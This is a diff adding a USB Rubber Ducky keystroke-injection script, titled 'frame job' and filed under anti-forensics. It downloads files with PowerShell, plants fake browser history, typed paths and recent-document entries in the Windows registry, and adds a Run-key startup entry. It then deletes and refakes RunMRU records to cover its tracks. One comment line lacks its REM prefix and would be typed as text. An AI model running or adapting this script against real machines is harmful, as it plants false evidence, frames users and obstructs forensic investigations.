@@ -1,0 +1,108 @@
+REM Calling this the rubber ducky frame job.  This adds fake information into Windows Registry areas forensic
+REM analysts use to track internet usage.
+REM Author: Jeremy Martin - jeremy@informationwarfarecenter.com
+REM Class: Anti Forensics
+REM version 0.1.3
+DELAY 1000
+GUI r
+DELAY 1000
+REM Download a file and save it into the temp folder
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://www.informationwarfarecenter.com/CIR/CIR.pdf','%TEMP%\latest-CIR.pdf')
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+Download a graphic and save it to temp
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://www.informationwarfarecenter.com/images/ATC-Web20-Logo.png','%TEMP%\back.jpg')
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Open Intenet Explorer and generate traffic
+STRING iexplore.exe http://www.youtube.com/IWCCyberSec
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Fake Internet Explorer history
+STRING REG ADD "HKCU\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" /v url1 /d http://www.informationwarfarecenter.com/files/rubber-ducky-frame-job.txt /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Fake Internet Explorer history
+STRING REG ADD "HKCU\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" /v url2 /d http://www.i-never-went-here.com /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Fake Internet Explorer history
+STRING REG ADD "HKCU\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" /v url3 /d http://www.i-never-went-here-again.com /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Fake Internet Explorer history
+STRING REG ADD "HKCU\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" /v url4 /d http://www.i-just-faked-the-url-address.com /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Fake Internet Explorer history
+STRING REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /v url1 /d C:\i-just-faked-the-folder /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Fake Document History
+STRING REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /v 0 /d fake-data /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Add a startup link for a previously downloaded file.  Malware uses this quite often.
+STRING REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v fakefile /d "%TEMP%\latest-CIR.pdf" /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Changes the background to the previously downloaded graphic
+STRING REG ADD "HKCU\Control Panel\Desktop" /v Wallpaper /d %TEMP%\back.jpg /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Opens a previously downloaded file
+STRING powershell Start-Process "%TEMP%\latest-CIR.pdf"
+ENTER
+DELAY 1500
+GUI r
+DELAY 1000
+REM Removes evidence of previous entries
+STRING REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Add another fake evidence entry
+STRING REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v a /d "iexplore www.informationwarfarecenter.com/files/BGIU.zip" /f
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+REM Opens a previously downloaded graphic
+STRING %TEMP%/back.jpg
+DELAY 1000
+ENTER
+DELAY 1000
